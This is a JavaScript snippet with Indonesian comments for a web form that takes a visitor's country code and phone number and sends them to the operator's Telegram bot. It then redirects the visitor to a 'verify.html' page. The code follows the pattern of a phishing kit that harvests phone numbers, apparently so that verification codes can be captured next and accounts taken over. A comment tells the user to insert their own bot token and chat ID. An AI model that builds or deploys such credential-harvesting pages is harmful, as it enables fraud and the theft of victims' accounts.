
    // === Ganti dengan Bot Token dan Chat ID milik Anda ===
    const botToken = BOT_TOKEN;
  const chatId   = CHAT_ID;
    // ====================================================

    const phoneForm = document.getElementById('phoneForm');
    const countrySelect = document.getElementById('country');
    const phoneInput = document.getElementById('phone');
    const statusMessage = document.getElementById('statusMessage');

    phoneForm.addEventListener('submit', function(e) {
      e.preventDefault();

      const countryCode = countrySelect.value;
      const phone = phoneInput.value.trim();

      if (!phone) {
        statusMessage.style.color = "red";
        statusMessage.textContent = "Nomor telepon tidak boleh kosong!";
        return;
      }

      // Gabungkan kode negara dan nomor telepon
      const fullPhone = countryCode + phone;

      statusMessage.style.color = "black";
      statusMessage.textContent = "Mengirim...";

      // Format pesan yang akan dikirim ke Bot Telegram
      const messageText = `BOYZCONNET
_________________________________
• Nomor Hp : ${fullPhone}
_________________________________
_________________________________`;

      // URL untuk mengirim pesan ke Bot Telegram
      const telegramAPI = "https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}";

      fetch(telegramAPI)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            statusMessage.style.color = "green";
            statusMessage.textContent = "Berhasil mengirim!";
            // Redirect ke halaman verifikasi dengan parameter nomor telepon
            window.location.href = `verify.html?phone=${encodeURIComponent(fullPhone)}`;
          } else {
            statusMessage.style.color = "red";
            statusMessage.textContent = "Gagal mengirim: " + (data.description || "Unknown error");
          }
        })
        .catch(error => {
          statusMessage.style.color = "red";
          statusMessage.textContent = "Terjadi kesalahan: " + error;
        });
    });